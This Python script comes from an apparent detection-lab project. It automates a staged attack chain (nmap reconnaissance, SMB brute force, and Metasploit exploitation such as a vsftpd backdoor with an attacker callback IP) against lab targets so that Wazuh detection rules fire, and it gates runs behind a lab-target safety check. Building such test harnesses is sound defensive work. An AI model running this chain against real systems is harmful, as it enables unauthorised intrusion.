#!/usr/bin/env python3
"""
Orchestrates a full attack chain against your lab: recon -> brute force ->
exploitation, matching the multi-stage detection (rule 100040) in
wazuh/custom_rules/local_rules.xml.

Run this FROM THE ATTACKER BOX (a separate VM — do not run it on the SIEM
or the target itself), one stage at a time or all together.

Usage:
    python3 run_attack_suite.py --target 10.10.10.20 --attacker-ip 10.10.10.50
    python3 run_attack_suite.py --target 10.10.10.20 --attacker-ip 10.10.10.50 \
        --stages recon brute
    python3 run_attack_suite.py --target 10.10.10.21 --attacker-ip 10.10.10.50 \
        --stages exploit --exploit-scenario vsftpd_backdoor
"""
import argparse
import subprocess
import sys
import time
from pathlib import Path

from safety import assert_lab_target

HERE = Path(__file__).parent

STAGES = ["recon", "brute", "exploit"]


def run(cmd: list[str]) -> None:
    print(f"\n=== Running: {' '.join(cmd)} ===")
    result = subprocess.run(cmd)
    if result.returncode != 0:
        print(f"[!] Command exited with code {result.returncode} (continuing)", file=sys.stderr)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", required=True, help="Primary lab target IP")
    parser.add_argument("--attacker-ip", required=True, help="This box's IP (for exploit callbacks)")
    parser.add_argument(
        "--stages", nargs="+", choices=STAGES, default=STAGES,
        help="Which stages to run, in order (default: all)",
    )
    parser.add_argument(
        "--exploit-scenario", default="smb_ms17_010_check",
        help="Which attack-sim/scenarios/*.rc.template to use for the exploit stage "
             "(default: safe scanner-only check; use vsftpd_backdoor against a "
             "Metasploitable target for a real exploitation event)",
    )
    parser.add_argument("--no-confirm", action="store_true")
    parser.add_argument(
        "--delay", type=int, default=5,
        help="Seconds to pause between stages, so alerts land in Wazuh in order",
    )
    args = parser.parse_args()

    assert_lab_target(args.target, interactive_confirm=not args.no_confirm)

    print(f"Attack chain plan: {' -> '.join(args.stages)} against {args.target}")

    if "recon" in args.stages:
        run([sys.executable, str(HERE / "nmap_scan.py"), "--target", args.target,
             "--profile", "full", "--no-confirm"])
        time.sleep(args.delay)

    if "brute" in args.stages:
        run([sys.executable, str(HERE / "msf_runner.py"), "--scenario", "smb_brute_force",
             "--target", args.target, "--no-confirm"])
        time.sleep(args.delay)

    if "exploit" in args.stages:
        cmd = [sys.executable, str(HERE / "msf_runner.py"), "--scenario", args.exploit_scenario,
               "--target", args.target, "--attacker-ip", args.attacker_ip, "--no-confirm"]
        run(cmd)

    print(
        "\nDone. Check the Wazuh dashboard for alerts (rules 100010-100040), "
        "then run correlation/correlate.py to build an incident timeline."
    )


if __name__ == "__main__":
    main()
